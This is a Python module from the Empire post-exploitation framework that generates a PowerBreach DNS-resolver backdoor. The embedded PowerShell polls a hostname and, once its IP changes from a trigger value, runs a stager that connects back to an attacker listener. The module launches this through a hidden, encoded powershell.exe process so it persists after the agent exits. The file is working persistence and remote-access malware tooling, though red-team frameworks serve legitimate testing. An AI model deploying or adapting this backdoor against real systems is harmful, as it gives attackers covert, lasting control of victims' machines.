from pathlib import Path

from empire.server.common import helpers
from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        script = """
function Invoke-ResolverBackdoor
{
    param(
        [Parameter(Mandatory=$False,Position=1)]
        [string]$Hostname,
        [Parameter(Mandatory=$False,Position=2)]
        [string]$Trigger="127.0.0.1",
        [Parameter(Mandatory=$False,Position=3)]
        [int] $Timeout=0,
        [Parameter(Mandatory=$False,Position=4)]
        [int] $Sleep=30
    )

    $running=$True
    $match =""
    $starttime = Get-Date
    while($running)
    {
        if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))
        {
            $running=$False
        }

        try {
            $ips = [System.Net.Dns]::GetHostAddresses($Hostname)
            foreach ($addr in $ips)
            {
                $resolved=$addr.IPAddressToString
                if($resolved -ne $Trigger)
                {
                    $running=$False
                    REPLACE_LAUNCHER
                }
            }
        }
        catch [System.Net.Sockets.SocketException]{

        }
        Start-Sleep -s $Sleep
    }
}
Invoke-ResolverBackdoor"""

        listener_name = params["Listener"]

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            raise ModuleValidationException("Invalid listener: " + listener_name)

        # set the listener value for the launcher
        stager = main_menu.stagertemplatesv2.new_instance("multi_launcher")
        stager.options["Listener"] = listener_name
        stager.options["Base64"] = "False"

        # and generate the code
        stager_code = stager.generate()

        if stager_code == "":
            raise ModuleValidationException("Error creating stager")
        script = script.replace("REPLACE_LAUNCHER", stager_code)

        for option, values in params.items():
            if (
                (
                    option.lower() != "agent"
                    and option.lower() != "listener"
                    and option.lower() != "outfile"
                )
                and values
                and values != ""
            ):
                if values.lower() == "true":
                    # if we're just adding a switch
                    script += " -" + str(option)
                else:
                    script += " -" + str(option) + " " + str(values)

        out_file = params["OutFile"]
        if out_file != "":
            # make the base directory if it doesn't exist
            out_path = Path(out_file)
            out_path.parent.mkdir(parents=True, exist_ok=True)
            out_path.write_text(script)

            raise ModuleValidationException(
                "[+] PowerBreach deaduser backdoor written to " + out_file
            )

        # transform the backdoor into something launched by powershell.exe
        # so it survives the agent exiting
        modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
        launcher = helpers.powershell_launcher(script, modifiable_launcher)
        stager_code = "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\" + launcher
        parts = stager_code.split(" ")

        # set up the start-process command so no new windows appears
        script = "Start-Process -NoNewWindow -FilePath '{}' -ArgumentList '{}'; 'PowerBreach Invoke-EventLogBackdoor started'".format(
            parts[0], " ".join(parts[1:])
        )

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
